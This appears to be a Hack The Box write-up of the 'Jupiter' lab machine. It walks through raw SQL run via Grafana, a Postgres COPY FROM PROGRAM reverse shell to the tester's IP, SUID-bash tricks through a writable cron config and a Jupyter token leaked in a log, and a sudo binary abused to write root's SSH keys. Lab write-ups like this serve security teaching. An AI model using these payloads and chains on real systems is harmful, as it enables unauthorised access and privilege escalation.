---
layout: post
title: "HTB: Jupiter"
subtitle: "Grafana SQL panel to Postgres COPY FROM PROGRAM, then three local hops to root via a sudo sattrack binary"
date: 2023-06-11
tags: [htb, linux, grafana, postgresql, jupyter, sudo]
category: writeups
kind: machine
tldr: "A kiosk subdomain ran Grafana 9.5.2, whose query endpoint let me run raw SQL against Postgres. COPY FROM PROGRAM gave a shell as postgres. From there a world-writable shadow simulation config run by a cron got me juno, a leaked Jupyter Notebook token got me jovian, and a sudo sattrack binary that reads /tmp/config.json let me write root's authorized_keys."
---

## the box

Jupiter is a medium Linux box at `10.10.11.216` and a long chain: five identities between the first request and the root flag. Ports `22` (OpenSSH 8.9p1) and `80` (nginx 1.18.0) were open, and 80 redirected to `jupiter.htb`. Each hop is its own misconfiguration, and none of them needs a memory-corruption exploit. They all come down to trusting input that should not be trusted: a client-supplied SQL query, a 777 config read by a cron, a token in a group-readable log, and a sudo binary that takes its output paths from an attacker-writable file.

## recon

```bash
nmap -p- --min-rate 10000 10.10.11.216
nmap -p 22,80 -sCV 10.10.11.216
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
```

I added `jupiter.htb` to `/etc/hosts`. The root site was a static space-themed page; directory busting only turned up the usual `/img`, `/css`, `/js`, `/fonts`. The vhost was the lead, so I fuzzed subdomains, filtering the 178-byte redirect response that every miss returned:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.jupiter.htb" -u http://jupiter.htb -fs 178
```

```
[Status: 200, Size: 34390] FUZZ: kiosk
```

`kiosk.jupiter.htb` served Grafana:

```
Grafana v9.5.2 (cfcea75916)
```

## foothold

The kiosk had public dashboards (anonymous org viewer is on by default in this setup). Each panel pulls its data from a Postgres datasource through Grafana's query proxy. Opening a dashboard like `/d/jMgFGfA4z/moons` and watching the traffic in Burp showed the panel POST to `/api/ds/query`, carrying the panel's SQL verbatim in a `rawSql` field:

```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
content-type: application/json
x-datasource-uid: YItSLg-Vz
x-plugin-id: postgres

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},
"rawSql":"select name as \"Name\", parent as \"Parent Planet\", meaning as \"Name Meaning\" from moons where parent = 'Saturn' order by name desc;",
"format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":931}],
"range":{"from":"2023-06-10T09:03:55.637Z","to":"2023-06-10T15:03:55.637Z","raw":{"from":"now-6h","to":"now"}},
"from":"1686387835637","to":"1686409435637"}
```

The endpoint runs whatever SQL you put in `rawSql`, so this is not an injection into an existing query, it is direct query execution against Postgres as the datasource user. Replacing `rawSql` with `select version();` confirmed control:

```
PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc 11.3.0, 64-bit
```

Postgres superusers can run shell commands through `COPY ... FROM PROGRAM`, the technique tracked under CVE-2019-9193. There is a public PoC ([b4keSn4ke/CVE-2019-9193](https://github.com/b4keSn4ke/CVE-2019-9193)) that connects over 5432 with psycopg2, but Postgres only listened on `127.0.0.1` here, so connecting from outside failed. The cleaner route was to drop the same SQL straight into the `rawSql` field, since Grafana is already inside the box. The PoC's pattern is a table plus a `COPY FROM PROGRAM`:

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.16.83/1337 0>&1"';
```

Sent through the query endpoint as a single `rawSql` value (escaping the inner quotes for JSON), with `nc -lvnp 1337` waiting:

```
COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.16.83/1337 0>&1\"'
```

That gave a shell as the `postgres` user.

## user

### postgres to juno

`netstat` showed services I could not reach from outside but could now see locally:

```
0.0.0.0:9595      python3
127.0.0.1:5432    postgres
127.0.0.1:3000    grafana
127.0.0.1:8888    (jupyter)
0.0.0.0:80
0.0.0.0:22
```

The accounts with real shells were `root`, `juno` (1000), `jovian` (1001), and `postgres`. I ran `pspy64` to watch scheduled work:

```
UID=1000 PID=190756 | /bin/bash /home/juno/shadow-simulation.sh
UID=1000 PID=190758 | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml
```

So juno's cron runs the Shadow network simulator against `/dev/shm/network-simulation.yml`. That file was mode 777 and, usefully, owned by `postgres`, the user I already controlled. Shadow launches each process listed under each host, so the config is an arbitrary-command primitive running as juno. The original is a benign python server plus three curl clients:

```yaml
hosts:
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

I rewrote the processes to copy bash and SUID it. `cp` and `chmod` each take an absolute path, no shell needed:

```yaml
general:
  stop_time: 10s
  model_unblocked_syscall_latency: true
network:
  graph:
    type: 1_gbit_switch
hosts:
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s
```

When the cron fired, `/tmp/bash` was a SUID copy owned by juno. `-p` keeps the privileges:

```bash
/tmp/bash -p
id
# uid=114(postgres) ... euid=1000(juno)
```

From that juno-euid shell I appended my public key to juno's `authorized_keys` and logged in cleanly for a stable session:

```bash
echo 'ssh-rsa AAAA... uncle_j4ck@Farm' >> /home/juno/.ssh/authorized_keys
ssh juno@10.10.11.216
```

juno owned `user.txt`.

### juno to jovian

`127.0.0.1:8888` was a Jupyter Notebook (version 6.5.3), bound to localhost. The notebook landing page demands a token and there was no way around the prompt, so I needed the token itself. juno was in the `science` group, and linpeas flagged `/opt/solar-flares/` as group-readable by `science`, including a `logs/` directory:

```
Group science:
/opt/solar-flares/logs
/opt/solar-flares/logs/jupyter-2023-06-10-02.log
...
```

Jupyter prints its access token to its own startup log. The current day's log had it:

```
juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-06-10-02.log
[I 15:02:39.572 NotebookApp] Jupyter Notebook 6.5.3 is running at:
[I 15:02:39.572 NotebookApp] http://localhost:8888/?token=6eaf64d92fea64f9718f44fdbb711d6022208c4b2791d742
```

(An older log had a stale token that no longer worked, so the date matters.) I forwarded the port over my SSH session and browsed in with the token:

```bash
ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216
# then http://localhost:8888/?token=6eaf64d92fea64f9718f44fdbb711d6022208c4b2791d742
```

Inside the notebook, a new cell shells out as the notebook owner. `id` confirmed jovian, in `sudo` and `science`:

```python
import os; os.system("id")
# uid=1001(jovian) gid=1002(jovian) groups=1002(jovian),27(sudo),1001(science)
```

Same SUID-bash trick from the notebook:

```python
import os; os.system("cp /bin/bash /tmp/loull; chmod u+s /tmp/loull")
```

It returned 0, so I ran the copy and dropped my key for a real shell:

```bash
/tmp/loull -p   # euid jovian
# append my key to /home/jovian/.ssh/authorized_keys
ssh jovian@10.10.11.216
```

## root

jovian had a single passwordless sudo rule:

```
jovian@jupiter:~$ sudo -l
User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

`sattrack` is a root-owned, non-stripped ELF:

```
/usr/local/bin/sattrack: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

Running it bare just printed `Configuration file has not been found. Please try again!`. I pulled it into Ghidra to find where that came from. It uses the nlohmann JSON library, so the config is JSON. Searching strings (`Ctrl+Shift+E`) for that error landed in `validateConfig()`, which spells out the whole config contract:

```c
local_2a8[0] = "/tmp/config.json";
...
cVar1 = std::filesystem::exists(local_228);
if (cVar1 != '\x01') {
    std::operator<<(std::cout,"Configuration file has not been found. Please try again!");
    return false;
}
nlohmann::operator>>(...,config);
// then a long chain of contains()/type() checks:
//   "tleroot"  must be a string  -> created if missing
//   "updatePerdiod" must be a number
//   "station"  must be an object with "name"(str),"lat"(num),"lon"(num),"hgt"(num)
//   "mapfile"  must be a string and the path must exist
//   "texturefile" must be a string and the path must exist
```

So the binary reads `/tmp/config.json` and validates a fixed schema. The interesting keys are `tlesources` (a list of URLs it downloads) and `tleroot` plus `tlefile` (the directory and filename it writes the downloaded data to). The binary runs as root via sudo, fetches each URL in `tlesources`, and saves it to `tleroot/tlefile`. That is an arbitrary file write as root if I control all three. `mapfile` and `texturefile` just have to point at files that already exist so validation passes, so I aimed them at the binary's own bundled assets.

I pointed the write at root's SSH directory and hosted my public key as `authorized_keys`:

```json
{
    "tleroot": "/root/.ssh/",
    "tlefile": "authorized_keys",
    "mapfile": "/usr/local/share/sattrack/map.json",
    "texturefile": "/usr/local/share/sattrack/earth.png",
    "tlesources": [
        "http://10.10.16.83:8000/authorized_keys"
    ],
    "updatePerdiod": 1000,
    "station": {
        "name": "LORCA",
        "lat": 37.6725,
        "lon": -1.5863,
        "hgt": 335.0
    },
    "show": [],
    "columns": ["name","azel","dis","geo","tab","pos","vel"]
}
```

With `python3 -m http.server 8000` serving my `authorized_keys`:

```bash
cp /tmp/config.json /tmp/config.json   # in place
sudo sattrack
```

It downloaded my key straight into `/root/.ssh/authorized_keys`. SSH as root:

```bash
ssh root@10.10.11.216
cat /root/root.txt
```

The same primitive reads root-only files too. Pointing `tlesources` at a path relative to `tleroot` and reading the result back lets you exfil arbitrary files, for example dropping `/root/root.txt` somewhere readable:

```json
{
    "tleroot": "/tmp/tle",
    "tlefile": "weather.txt",
    "mapfile": "/root/root.txt",
    "texturefile": "/usr/local/share/sattrack/earth.png",
    "tlesources": ["../../root/root.txt"],
    "updatePerdiod": 1000,
    "station": {"name": "LORCA", "lat": 37.6725, "lon": -1.5863, "hgt": 335.0},
    "show": [],
    "columns": []
}
```

## takeaway

Five identities to reach root, and each hop was its own misconfiguration. Grafana running a client-supplied SQL query against Postgres, a cron reading a 777 config, a notebook token sitting in a group-readable log, and a sudo binary that takes its file destinations from an attacker-writable config. None needed a real exploit, just trusting input that should never be trusted.
